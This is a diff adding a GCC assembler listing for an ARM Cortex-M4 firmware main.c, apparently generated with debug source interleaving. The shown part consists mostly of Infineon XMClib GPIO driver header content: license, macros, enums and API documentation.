@@ -1,0 +1,2719 @@
+   1              		.cpu cortex-m4
+   2              		.arch armv7e-m
+   3              		.fpu fpv4-sp-d16
+   4              		.eabi_attribute 27, 1
+   5              		.eabi_attribute 20, 1
+   6              		.eabi_attribute 21, 1
+   7              		.eabi_attribute 23, 3
+   8              		.eabi_attribute 24, 1
+   9              		.eabi_attribute 25, 1
+  10              		.eabi_attribute 26, 1
+  11              		.eabi_attribute 30, 6
+  12              		.eabi_attribute 34, 1
+  13              		.eabi_attribute 18, 4
+  14              		.file	"main.c"
+  15              		.text
+  16              	.Ltext0:
+  17              		.cfi_sections	.debug_frame
+  18              		.section	.text.XMC_GPIO_SetOutputHigh,"ax",%progbits
+  19              		.align	1
+  20              		.syntax unified
+  21              		.thumb
+  22              		.thumb_func
+  24              	XMC_GPIO_SetOutputHigh:
+  25              	.LFB130:
+  26              		.file 1 "/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h"
+   1:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** /**
+   2:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * @file xmc_gpio.h
+   3:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * @date 2015-06-20
+   4:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+   5:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * @cond
+   6:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  **************************************************************************************************
+   7:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * XMClib v2.1.16 - XMC Peripheral Driver Library 
+   8:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+   9:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * Copyright (c) 2015-2017, Infineon Technologies AG
+  10:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * All rights reserved.                        
+  11:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *                                             
+  12:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * Redistribution and use in source and binary forms, with or without modification,are permitted pr
+  13:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * following conditions are met:   
+  14:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *                                                                              
+  15:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * Redistributions of source code must retain the above copyright notice, this list of conditions a
+  16:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * disclaimer.                        
+  17:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * 
+  18:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * Redistributions in binary form must reproduce the above copyright notice, this list of condition
+  19:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * disclaimer in the documentation and/or other materials provided with the distribution.          
+  20:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * 
+  21:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * Neither the name of the copyright holders nor the names of its contributors may be used to endor
+  22:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * products derived from this software without specific prior written permission.                  
+  23:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *                                                                              
+  24:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR I
+  25:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTI
+  26:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE  FOR ANY DIRECT, IN
+  27:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBS
+  28:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THE
+  29:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * WHETHER IN CONTRACT, STRICT LIABILITY,OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY
+  30:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.                            
+  31:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *                                                                              
+  32:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * To improve the quality of the software, users are encouraged to share modifications, enhancement
+  33:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * Infineon Technologies AG dave@infineon.com).                                                    
+  34:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  **************************************************************************************************
+  35:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+  36:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * Change History
+  37:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * --------------
+  38:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+  39:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * 2015-02-20:
+  40:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *     - Initial draft<br>
+  41:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *     - Documentation improved <br>
+  42:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *      
+  43:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * 2015-06-20:
+  44:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *     - Removed version macros and declaration of GetDriverVersion API
+  45:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+  46:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * @endcond
+  47:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+  48:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  */
+  49:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** 
+  50:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** #ifndef XMC_GPIO_H
+  51:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** #define XMC_GPIO_H
+  52:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** 
+  53:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** /**************************************************************************************************
+  54:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * HEADER FILES
+  55:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  **************************************************************************************************
+  56:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** 
+  57:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** #include "xmc_common.h"
+  58:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** 
+  59:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** /**
+  60:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * @addtogroup XMClib XMC Peripheral Library
+  61:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * @{
+  62:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  */
+  63:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** 
+  64:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** /**
+  65:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * @addtogroup GPIO
+  66:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * @brief General Purpose Input Output (GPIO) driver for the XMC microcontroller family.
+  67:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+  68:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * GPIO driver provide a generic and very flexible software interface for all standard digital I/O 
+  69:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * Each port slice has individual interfaces for the operation as General Purpose I/O and it furthe
+  70:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * connectivity to the on-chip periphery and the control for the pad characteristics. 
+  71:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+  72:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * The driver is divided into Input and Output mode.
+  73:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+  74:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * Input mode features:
+  75:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * -# Configuration structure XMC_GPIO_CONFIG_t and initialization function XMC_GPIO_Init()
+  76:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * -# Allows the selection of weak pull-up or pull-down device. Configuration structure XMC_GPIO_MO
+  77:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * \if XMC1
+  78:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * -# Allows the selection of input hysteresis. XMC_GPIO_SetInputHysteresis()
+  79:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * \endif
+  80:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+  81:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * 
+  82:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * Output mode features:
+  83:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * -# Allows the selection of push pull/open drain and Alternate output. Configuration structure XM
+  84:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * \if XMC4
+  85:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * -# Allows the selection of pad driver strength. Configuration structure XMC_GPIO_OUTPUT_STRENGTH
+  86:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * \endif
+  87:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+  88:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * -# Allows the selection of initial output level. Configuration structure XMC_GPIO_OUTPUT_LEVEL_t
+  89:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+  90:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *@{
+  91:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  */
+  92:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  
+  93:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** /**************************************************************************************************
+  94:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * MACROS
+  95:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  **************************************************************************************************
+  96:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** 
+  97:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** #define PORT_IOCR_PC_Pos PORT0_IOCR0_PC0_Pos
+  98:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** #define PORT_IOCR_PC_Msk PORT0_IOCR0_PC0_Msk
+  99:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** 
+ 100:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** #define PORT_IOCR_PC_Size 				(8U)
+ 101:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** 											
+ 102:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** 
+ 103:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** #define XMC_GPIO_CHECK_OUTPUT_LEVEL(level) ((level == XMC_GPIO_OUTPUT_LEVEL_LOW) || \
+ 104:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****                                             (level == XMC_GPIO_OUTPUT_LEVEL_HIGH))
+ 105:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****                                             
+ 106:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** #define XMC_GPIO_CHECK_HWCTRL(hwctrl) ((hwctrl == XMC_GPIO_HWCTRL_DISABLED) || \
+ 107:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****                                        (hwctrl == XMC_GPIO_HWCTRL_PERIPHERAL1) || \
+ 108:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****                                        (hwctrl == XMC_GPIO_HWCTRL_PERIPHERAL2))                    
+ 109:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****                                             
+ 110:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** /**************************************************************************************************
+ 111:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * ENUMS
+ 112:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  **************************************************************************************************
+ 113:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** 
+ 114:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** 
+ 115:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** /**
+ 116:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * Defines output level of a pin. Use type \a XMC_GPIO_OUTPUT_LEVEL_t for this enum.
+ 117:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  */
+ 118:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** typedef enum XMC_GPIO_OUTPUT_LEVEL
+ 119:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** {
+ 120:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****   XMC_GPIO_OUTPUT_LEVEL_LOW  = 0x10000U, /**<  Reset bit */
+ 121:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****   XMC_GPIO_OUTPUT_LEVEL_HIGH = 0x1U, 	/**< Set bit  */
+ 122:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** } XMC_GPIO_OUTPUT_LEVEL_t;
+ 123:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** 
+ 124:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** /**
+ 125:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * Defines direct hardware control characteristics of the pin . Use type \a XMC_GPIO_HWCTRL_t for t
+ 126:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  */
+ 127:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** typedef enum XMC_GPIO_HWCTRL
+ 128:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** {
+ 129:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****   XMC_GPIO_HWCTRL_DISABLED     = 0x0U, /**<  Software control only */
+ 130:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****   XMC_GPIO_HWCTRL_PERIPHERAL1  = 0x1U, /**<  HWI0/HWO0 control path can override the software confi
+ 131:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****   XMC_GPIO_HWCTRL_PERIPHERAL2  = 0x2U  /**<  HWI1/HWO1 control path can override the software confi
+ 132:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** } XMC_GPIO_HWCTRL_t;
+ 133:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** 
+ 134:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** /**************************************************************************************************
+ 135:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * DEVICE FAMILY EXTENSIONS
+ 136:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  **************************************************************************************************
+ 137:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** 
+ 138:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  #if UC_FAMILY == XMC1
+ 139:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** #include "xmc1_gpio.h"
+ 140:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** #elif UC_FAMILY == XMC4
+ 141:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** #include "xmc4_gpio.h"
+ 142:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** #else
+ 143:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** #error "xmc_gpio.h: family device not supported"
+ 144:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** #endif
+ 145:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** 
+ 146:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** /**************************************************************************************************
+ 147:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * API PROTOTYPES
+ 148:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  **************************************************************************************************
+ 149:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** 
+ 150:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** #ifdef __cplusplus
+ 151:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** extern "C" {
+ 152:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** #endif
+ 153:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** 
+ 154:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** 
+ 155:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** /**
+ 156:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * @param  port	  Constant pointer pointing to GPIO port, to access port registers like Pn_OUT,Pn_O
+ 157:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * @param  pin	  Port pin number.
+ 158:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * @param  config GPIO configuration data structure. Refer data structure @ref XMC_GPIO_CONFIG_t fo
+ 159:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+ 160:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * @return None
+ 161:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+ 162:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * \par<b>Description:</b><br>
+ 163:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * \if XMC1
+ 164:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * Initializes input / output mode settings like, pull up / pull down devices,hysteresis, push pull
+ 165:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * Also configures alternate function outputs and clears hardware port control for a selected \a po
+ 166:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * \a config provides selected I/O settings. It configures hardware registers Pn_IOCR,Pn_OUT, Pn_OM
+ 167:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * \endif
+ 168:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * \if XMC4
+ 169:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * Initializes input / output mode settings like, pull up / pull down devices,push pull /open drain
+ 170:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * Also configures alternate function outputs and clears hardware port control for selected \a port
+ 171:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * It configures hardware registers Pn_IOCR,Pn_OUT,Pn_OMR,Pn_PDISC and Pn_PDR.\n
+ 172:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * \endif
+ 173:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+ 174:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * \par<b>Related APIs:</b><BR>
+ 175:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *  None
+ 176:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+ 177:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * \par<b>Note:</b><br>
+ 178:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * This API is called in definition of DAVE_init by code generation and therefore should not be exp
+ 179:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * for the normal operation. Use other APIs only after DAVE_init is called successfully (returns DA
+ 180:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+ 181:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+ 182:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  */
+ 183:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** 
+ 184:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  
+ 185:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** void XMC_GPIO_Init(XMC_GPIO_PORT_t *const port, const uint8_t pin, const XMC_GPIO_CONFIG_t *const c
+ 186:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  
+ 187:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** /**
+ 188:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+ 189:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * @param  port	Constant pointer pointing to GPIO port, to access hardware register Pn_IOCR.
+ 190:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * @param  pin	Port pin number.
+ 191:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * @param  mode input / output functionality selection. Refer @ref XMC_GPIO_MODE_t for valid values
+ 192:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+ 193:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * @return None
+ 194:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+ 195:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * \par<b>Description:</b><br>
+ 196:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * Sets digital input and output driver functionality and characteristics of a GPIO port pin. It co
+ 197:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * registers Pn_IOCR. \a mode is initially configured during initialization in XMC_GPIO_Init(). Cal
+ 198:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * the port direction functionality as needed later in the program.
+ 199:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+ 200:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * \par<b>Related APIs:</b><BR>
+ 201:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *  None
+ 202:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+ 203:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  */
+ 204:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** 
